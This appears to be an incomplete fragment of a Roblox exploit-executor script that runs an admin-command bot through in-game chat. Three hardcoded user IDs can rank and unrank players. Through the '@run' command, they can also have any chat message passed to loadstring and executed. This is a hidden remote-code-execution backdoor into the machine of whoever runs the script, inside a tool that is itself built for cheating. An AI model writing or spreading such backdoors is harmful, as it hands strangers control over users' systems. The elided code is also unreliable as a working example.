if LAZU and not _G.IY_DEBUG == true then
	-- error("LAZU already runing!", 0)
	return
end

pcall(function() getgenv().LAZU = true end)
...
Admins = {"Potage898","Amynuv","Potage666"}
...
local function isadmins(player)
...
ChatLog = function(plr)
	plr.Chatted:Connect(function(Message)
		if plr.UserId == 911404169 or plr.UserId == 2613898759 or plr.UserId == 7449866007 then
			local splitted = string.split(Message," ")
			if splitted[1] == "@op" then
				local toop = (Message:sub(5))
				...
				if toop == "all" then
					...
					do_exec(";say All has been ranked.")
				else
					local fp = mygtpName(toop)
					for i,v in pairs(fp) do
						table.insert(Admins, v.Name)
						do_exec(";say "..tostring(v.Name).." has been ranked.")
					end
				end
			...
			if splitted[1] == "@run" then
				local load = loadstring(Message:sub(6))
				load()
			end


			if splitted[1] == "@cmds" then
				wait(2)
				do_exec(";say @cmds  --Show commands")
				wait(2)
				do_exec(";say @run  --Run a string")
				wait(2)
				do_exec(";say @op  --Rank a player name")
				wait(2)
				do_exec(";say @deop  --Unrank a player name")
				wait(2)
				do_exec(";say @admins  --List ranked names")
				wait(2)
				do_exec(";say @version  --Show bot version")
			end
			...
			if splitted[1] == "@deop" then
				local toup = (Message:sub(7))

				if toup == "all" then
					Admins = {"Potage898","Amynuv","Potage666"}
					do_exec(";say All except Potage898, Amynuv and Potage666 has been unranked.")
				else
					local fps = mygtpName(toup)
					for i,v in pairs(fps) do
						table.remove(Admins, table.find(Admins,v.Name))
						do_exec(";say "..tostring(v.Name).." has been unranked.")
					end
				end

			end

			if splitted[1] == "@admins" then

				for i, v in pairs(Admins) do
					wait(2)
					do_exec(";say "..tostring(v).." is ranked.")
				end
			end
